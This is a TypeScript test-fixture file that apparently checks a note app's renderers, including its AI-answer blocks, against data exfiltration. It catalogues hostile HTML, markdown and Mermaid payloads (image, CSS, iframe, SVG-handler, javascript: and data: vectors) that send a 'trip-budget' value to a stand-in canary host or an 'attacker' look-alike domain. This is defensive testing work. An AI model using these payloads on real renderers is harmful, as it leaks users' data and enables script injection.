import {
  AI_BLOCK_STATUS,
  IMAGE_FIGURE_ATTRIBUTE,
  MERMAID_BLOCK_ATTR,
  MERMAID_CODE_ATTR,
} from '@knowtis/editor-schema';
import { STORED_IMAGE_HOST } from '@knowtis/shared-util';

/** A host under the reserved `.invalid` TLD, so no request to it can ever be answered. */
export const CANARY_HOST = 'canary.invalid';

/** Text rendered beside every payload: seeing it proves the surface rendered. */
const BENIGN_TEXT = 'Benign paragraph that must still render';

/**
 * A text matcher for the innermost element holding all of {@link BENIGN_TEXT},
 * even when a streaming renderer splits it into one span per word.
 */
export function isBenignText(_: string, element: Element | null): boolean {
  return (
    element?.textContent === BENIGN_TEXT &&
    ![...element.children].some((child) => child.textContent === BENIGN_TEXT)
  );
}

/** An image the app's blob store serves, which every surface that shows images keeps. */
export const STORED_IMAGE_URL = `https://${STORED_IMAGE_HOST}/notes/fixture/kept.webp`;
export const STORED_IMAGE_ALT = 'kept stored image';

/** A link every surface keeps, so a click check always has something to click. */
const BENIGN_LINK_TEXT = 'benign link';
const BENIGN_LINK_URL = 'https://example.com/docs';

interface HostilePayload {
  readonly name: string;
  readonly source: string;
}

/** A markdown answer holding `payload` between the benign text, a stored image and a benign link. */
export function hostileMarkdownDocument(payload: string): string {
  return [
    BENIGN_TEXT,
    `![${STORED_IMAGE_ALT}](${STORED_IMAGE_URL})`,
    `[${BENIGN_LINK_TEXT}](${BENIGN_LINK_URL})`,
    payload,
  ].join('\n\n');
}

/** An HTML note body holding `payload` between the benign text, a stored image and a benign link. */
export function hostileHtmlDocument(payload: string): string {
  return [
    `<p>${BENIGN_TEXT}</p>`,
    `<figure ${IMAGE_FIGURE_ATTRIBUTE}=""><img src="${STORED_IMAGE_URL}" alt="${STORED_IMAGE_ALT}"></figure>`,
    `<p><a href="${BENIGN_LINK_URL}">${BENIGN_LINK_TEXT}</a></p>`,
    payload,
  ].join('');
}

function leak(vector: string): string {
  return `https://${CANARY_HOST}/${vector}?d=trip-budget`;
}

/** HTML that tries to make the page load something the moment it renders. */
export const HOSTILE_HTML: readonly HostilePayload[] = [
  { name: 'an <img>', source: `<img src="${leak('img')}" alt="chart">` },
  {
    name: 'a note-schema image figure',
    source: `<figure ${IMAGE_FIGURE_ATTRIBUTE}=""><img src="${leak('figure')}" alt="chart"></figure>`,
  },
  {
    name: 'an <img> with an entity-encoded scheme',
    source: `<img src="https&#58;//${CANARY_HOST}/entity.png" alt="chart">`,
  },
  {
    name: 'a lazy <img>',
    source: `<img src="${leak('lazy')}" loading="lazy" alt="chart">`,
  },
  {
    name: 'a srcset beside a stored src',
    source: `<img src="${STORED_IMAGE_URL}" srcset="${leak('srcset')} 2x" alt="chart">`,
  },
  {
    name: 'a <picture> source beside a stored image',
    source: `<picture><source srcset="${leak('picture')}"><img src="${STORED_IMAGE_URL}" alt="chart"></picture>`,
  },
  {
    name: 'a <picture> source beside a bare <img>',
    source: `<picture><source srcset="${leak('picture-bare')}"><img alt="chart"></picture>`,
  },
  {
    name: 'a style attribute url()',
    source: `<p style="background-image:url(${leak('style-attr')})">styled</p>`,
  },
  {
    name: 'a style attribute image-set()',
    source: `<p style="background-image:image-set('${leak('image-set')}' 1x)">styled</p>`,
  },
  {
    name: 'a <style> element',
    source: `<style>@import url(${leak('import')}); p { background: url(${leak('style-el')}) }</style>`,
  },
  {
    name: 'a prefetch <link>',
    source: `<link rel="prefetch" href="${leak('prefetch')}">`,
  },
  {
    name: 'a stylesheet <link>',
    source: `<link rel="stylesheet" href="${leak('stylesheet')}">`,
  },
  { name: 'an <iframe>', source: `<iframe src="${leak('iframe')}"></iframe>` },
  { name: 'an <object>', source: `<object data="${leak('object')}"></object>` },
  { name: 'an <embed>', source: `<embed src="${leak('embed')}">` },
  {
    name: 'a refresh <meta>',
    source: `<meta http-equiv="refresh" content="0;url=${leak('refresh')}">`,
  },
  {
    name: 'a <base> that rebases relative URLs',
    source: `<base href="${leak('base')}">`,
  },
  {
    name: 'an svg <image>',
    source: `<svg><image href="${leak('svg-image')}" /></svg>`,
  },
  {
    name: 'an svg external <use>',
    source: `<svg><use href="${leak('svg-use')}#a" /></svg>`,
  },
  {
    name: 'a <video> poster and source',
    source: `<video poster="${leak('poster')}"><source src="${leak('video-src')}"></video>`,
  },
  {
    name: 'an image <input>',
    source: `<input type="image" src="${leak('input')}" alt="go">`,
  },
  {
    name: 'a table background',
    source: `<table background="${leak('table')}"><tr><td>cell</td></tr></table>`,
  },
  {
    name: 'an svg onload handler',
    source: `<svg onload="new Image().src='${leak('onload')}'"></svg>`,
  },
  {
    name: 'a details ontoggle handler',
    source: `<details open ontoggle="new Image().src='${leak('ontoggle')}'"><summary>more</summary></details>`,
  },
  {
    name: 'a relative <img> into the analytics proxy',
    source: '<img src="/t/e/?d=trip-budget" alt="chart">',
  },
  {
    name: 'a data: <img>',
    source: '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="chart">',
  },
  {
    name: 'a blob: <img>',
    source: `<img src="blob:https://${CANARY_HOST}/0b9c2a1e" alt="chart">`,
  },
];

/** Markdown-only image syntax; raw HTML is markdown too, so {@link HOSTILE_MARKDOWN} adds {@link HOSTILE_HTML}. */
const MARKDOWN_IMAGES: readonly HostilePayload[] = [
  { name: 'a markdown image', source: `![chart](${leak('md-image')})` },
  {
    name: 'a markdown image with a title',
    source: `![chart](${leak('md-title')} "Budget")`,
  },
  {
    name: 'a reference-style image',
    source: `![chart][budget]\n\n[budget]: ${leak('md-reference')}`,
  },
  {
    name: 'a protocol-relative image',
    source: `![chart](//${CANARY_HOST}/protocol-relative.png)`,
  },
  {
    name: 'a relative image into the analytics proxy',
    source: '![chart](/t/e/?d=trip-budget)',
  },
  {
    name: 'a data: image',
    source: '![chart](data:image/svg+xml;base64,PHN2Zy8+)',
  },
  {
    name: 'a look-alike blob store host',
    source:
      '![chart](https://attacker.public.blob.vercel-storage.com/notes/a.webp)',
  },
  {
    name: 'the blob store host as userinfo',
    source: `![chart](https://${STORED_IMAGE_HOST}@${CANARY_HOST}/userinfo.webp)`,
  },
  {
    name: 'a backslash authority',
    source: `![chart](https:\\\\${CANARY_HOST}/backslash.png)`,
  },
];

export const HOSTILE_MARKDOWN: readonly HostilePayload[] = [
  ...MARKDOWN_IMAGES,
  ...HOSTILE_HTML,
];

/** Links an attacker wants clicked: each must open nothing on a plain click. */
export const HOSTILE_LINKS_HTML: readonly HostilePayload[] = [
  {
    name: 'an external link',
    source: `<a href="${leak('link')}">external link</a>`,
  },
  {
    name: 'an external link opening a new tab',
    source: `<a href="${leak('link-blank')}" target="_blank">new tab link</a>`,
  },
  {
    name: 'a javascript: link',
    source: '<a href="javascript:alert(document.domain)">script link</a>',
  },
  {
    name: 'a data: link',
    source:
      '<a href="data:text/html,<script>alert(document.domain)</script>">data link</a>',
  },
  {
    name: 'an svg link',
    source: `<svg><a href="${leak('svg-link')}"><text>svg link</text></a></svg>`,
  },
  {
    name: 'a form that submits on a click',
    source: `<form action="${leak('form')}"><button>Continue</button></form>`,
  },
];

export const HOSTILE_LINKS_MARKDOWN: readonly HostilePayload[] = [
  {
    name: 'a markdown link',
    source: `[markdown link](${leak('md-link')})`,
  },
  {
    name: 'a javascript: markdown link',
    source: '[script link](javascript:alert(document.domain))',
  },
  {
    name: 'an irc: markdown link',
    source: `[chat link](irc://${CANARY_HOST}/channel)`,
  },
  { name: 'an autolink', source: `<${leak('autolink')}>` },
  { name: 'a bare URL', source: `see ${leak('bare-url')} now` },
  {
    name: 'a reference-style link',
    source: `[reference link][docs]\n\n[docs]: ${leak('md-ref-link')}`,
  },
  ...HOSTILE_LINKS_HTML,
];

/** Diagrams whose loads Mermaid's label sanitizer, `secure` keys or strict mode stop before drawing. */
export const HOSTILE_MERMAID: readonly HostilePayload[] = [
  {
    name: 'a label <img>',
    source: `flowchart TD\n  A["<img src=${leak('mermaid-label')}>"] --> B`,
  },
  {
    name: 'a label style url()',
    source: `flowchart TD\n  A["<span style='background-image:url(${leak('mermaid-span')})'>x</span>"] --> B`,
  },
  {
    name: 'a themeCSS directive',
    source: `%%{init: {"themeCSS": "div { background-image: url(${leak('mermaid-theme')}) }"}}%%\nflowchart TD\n  A --> B`,
  },
  {
    name: 'a click href',
    source: `flowchart TD\n  A --> B\n  click A href "${leak('mermaid-click')}" _blank`,
  },
  {
    name: 'a click callback',
    source: 'flowchart TD\n  A --> B\n  click A call alert(document.domain)',
  },
];

/** Diagrams Mermaid fetches from while it draws, before any layer of ours runs: only the `img-src` CSP bounds those fetches. */
export const DRAW_TIME_MERMAID: readonly HostilePayload[] = [
  {
    name: 'a state classDef url()',
    source: `stateDiagram-v2\n  classDef bad background:url(${leak('mermaid-classdef')})\n  [*] --> A\n  class A bad`,
  },
  {
    name: 'a class diagram style url()',
    source: `classDiagram\n  class A\n  style A fill:url(${leak('mermaid-style')})`,
  },
  {
    name: 'a flowchart image shape',
    source: `flowchart TD\n  A@{ img: "${leak('mermaid-img-shape')}", label: "L", pos: "t", h: 60, constraint: "on" }`,
  },
];

/** Every hostile diagram, for a surface that must never draw one. */
export const MERMAID_SOURCES: readonly HostilePayload[] = [
  ...HOSTILE_MERMAID,
  ...DRAW_TIME_MERMAID,
];

export function mermaidFence(source: string): string {
  return `\`\`\`mermaid\n${source}\n\`\`\``;
}

const ATTRIBUTE_ESCAPES: Readonly<Record<string, string>> = {
  '&': '&amp;',
  '"': '&quot;',
  '<': '&lt;',
  '>': '&gt;',
};

function escapeAttribute(value: string): string {
  return value.replace(/[&"<>]/g, (char) => ATTRIBUTE_ESCAPES[char] ?? char);
}

/** The note-schema HTML of a mermaid block holding `source`. */
export function mermaidBlockHtml(source: string): string {
  return `<div ${MERMAID_BLOCK_ATTR}="" ${MERMAID_CODE_ATTR}="${escapeAttribute(source)}"></div>`;
}

const AI_BLOCK_ATTR = 'data-ai-block';

/** The note-schema HTML of a finished AI block whose answer is `markdown`. */
export function doneAIBlockHtml(markdown: string): string {
  return `<div ${AI_BLOCK_ATTR}="" status="${AI_BLOCK_STATUS.DONE}" content="${escapeAttribute(markdown)}"></div>`;
}
